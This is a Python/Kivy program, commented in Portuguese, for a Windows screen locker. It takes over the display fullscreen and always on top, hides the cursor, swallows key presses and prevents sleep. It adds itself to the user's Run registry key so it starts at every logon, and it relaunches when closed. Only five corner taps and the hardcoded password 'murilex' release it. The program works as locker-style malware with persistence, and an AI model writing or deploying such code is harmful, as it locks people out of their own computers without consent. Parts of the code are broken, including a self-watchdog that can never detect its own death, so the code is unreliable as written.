# -*- coding: utf-8 -*-
# Bloqueador de tela em modo usuário (sem admin) – Windows .exe com Kivy
# Fecha apenas com senha "murilex" via 5 toques no canto inferior direito.
# Reinicia automaticamente se o processo for morto (watchdog interno).
# Ao digitar a senha correta, o app fecha PERMANENTEMENTE e NÃO reinicia.

import os
import sys
import time
import subprocess
import threading
import signal
import atexit
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.popup import Popup
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.config import Config

# Configurações para tela cheia sem bordas
Config.set('graphics', 'fullscreen', 'auto')
Config.set('graphics', 'resizable', False)
Config.set('graphics', 'borderless', 1)
Window.show_cursor = False

# Senha fixa
PASSWORD = "murilex"
exit_allowed = False
watchdog_active = True  # Flag para desativar o watchdog após senha correta

class BlockerWidget(Widget):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.touch_count = 0
        self.touch_timer = None
        # Bloqueia teclado (apenas para janela ativa)
        self._keyboard = Window.request_keyboard(self._keyboard_closed, self)
        self._keyboard.bind(on_key_down=self._on_key_down)
        # Mantém tela ligada (Windows)
        self._prevent_sleep()
        # Inicia watchdog para reiniciar se morto (somente se flag ativa)
        self.watchdog_thread = threading.Thread(target=self.watchdog, daemon=True)
        self.watchdog_thread.start()
        # Tenta adicionar à inicialização automática (sem admin)
        self._add_to_startup()

    def _keyboard_closed(self):
        pass

    def _on_key_down(self, keyboard, keycode, text, modifiers):
        # Bloqueia todas as teclas (Alt+F4, Win, etc.) – apenas na janela
        return True  # engole o evento

    def _prevent_sleep(self):
        # Impede suspensão do sistema (API do Windows sem admin)
        try:
            import ctypes
            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)  # ES_CONTINUOUS | ES_SYSTEM_REQUIRED
        except:
            pass

    def _add_to_startup(self):
        # Adiciona ao Registro do usuário (HKCU) – não requer admin
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "BlockerApp", 0, winreg.REG_SZ, sys.executable + " " + " ".join(sys.argv))
            winreg.CloseKey(handle)
        except:
            pass

    def on_touch_down(self, touch):
        # Canto inferior direito – área de 100x100 pixels
        if touch.x > Window.width - 100 and touch.y < 100:
            self.touch_count += 1
            if self.touch_timer:
                self.touch_timer.cancel()
            self.touch_timer = Clock.schedule_once(self._reset_touch_count, 2)
            if self.touch_count >= 5:
                self.touch_count = 0
                self._show_password_popup()
        return True  # bloqueia cliques em outros elementos

    def _reset_touch_count(self, dt):
        self.touch_count = 0

    def _show_password_popup(self):
        content = BoxLayout(orientation='vertical', spacing=10, padding=10)
        content.add_widget(Label(text='Digite a senha:', size_hint=(1, 0.3), color=(1,1,1,1)))
        self.pass_input = TextInput(password=True, multiline=False, size_hint=(1, 0.4))
        content.add_widget(self.pass_input)
        btn = Button(text='Desbloquear', size_hint=(1, 0.3))
        content.add_widget(btn)

        popup = Popup(title='Proteção', content=content, size_hint=(0.6, 0.4), auto_dismiss=False)
        btn.bind(on_press=lambda x: self._check_password(self.pass_input.text, popup))
        popup.open()

    def _check_password(self, text, popup):
        global exit_allowed, watchdog_active
        if text == PASSWORD:
            popup.dismiss()
            exit_allowed = True
            watchdog_active = False  # DESATIVA O WATCHDOG PERMANENTEMENTE
            App.get_running_app().stop()  # Fecha o app definitivamente
        else:
            # Mensagem de erro
            for child in popup.content.children:
                if isinstance(child, Label) and child.text == 'Digite a senha:':
                    continue
                if isinstance(child, Label):
                    child.text = 'Senha incorreta!'
                    child.color = (1,0,0,1)
            self.pass_input.text = ''

    def watchdog(self):
        # Verifica a cada 3 segundos se o processo pai ainda existe
        # Só reinicia se watchdog_active for True
        global watchdog_active
        while True:
            time.sleep(3)
            if not watchdog_active:
                # Se desativado, dorme para sempre (não faz nada)
                while True:
                    time.sleep(3600)
            try:
                # Se o processo atual ainda está vivo, os.kill(pid, 0) não lança exceção
                os.kill(os.getpid(), 0)
            except OSError:
                # Processo morto – reinicia (apenas se watchdog ainda ativo)
                if watchdog_active:
                    subprocess.Popen([sys.executable] + sys.argv, creationflags=subprocess.DETACHED_PROCESS)
                    sys.exit(0)

class BlockerApp(App):
    def build(self):
        # Janela sempre no topo (sem admin, funciona apenas para a janela)
        Window.always_on_top = True
        return BlockerWidget()

    def on_stop(self):
        global exit_allowed, watchdog_active
        if not exit_allowed:
            # Se fechou sem senha, reinicia imediatamente (apenas se watchdog ativo)
            if watchdog_active:
                subprocess.Popen([sys.executable] + sys.argv, creationflags=subprocess.DETACHED_PROCESS)
        # Se saiu com senha, exit_allowed = True e watchdog_active = False, então NÃO reinicia

if __name__ == '__main__':
    # Evita múltiplas instâncias usando mutex nomeado (Windows)
    try:
        import win32event, win32api, winerror
        mutex = win32event.CreateMutex(None, False, "Global_BlockerApp_SingleInstance")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            sys.exit(0)
    except:
        # Se win32api não disponível, usa arquivo de lock
        lock_file = os.path.join(os.environ['TEMP'], 'blocker.lock')
        try:
            import fcntl
            f = open(lock_file, 'w')
            fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except:
            sys.exit(0)

    BlockerApp().run()